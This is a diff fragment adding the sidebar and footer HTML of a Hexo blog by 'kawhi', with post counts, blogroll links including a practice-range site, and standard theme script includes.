+  <p class="site-author-name" itemprop="name">kawhi</p>
+  <div class="site-description" itemprop="description">PHP是世界上最好的语言</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://47.98.234.232:8000/" title="http:&#x2F;&#x2F;47.98.234.232:8000&#x2F;" rel="noopener" target="_blank">G2mtu备用靶场</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://kawhi.gearhostpreview.com/" title="http:&#x2F;&#x2F;kawhi.gearhostpreview.com&#x2F;" rel="noopener" target="_blank">OneDrive网盘</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kawhi</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">226k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:25</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
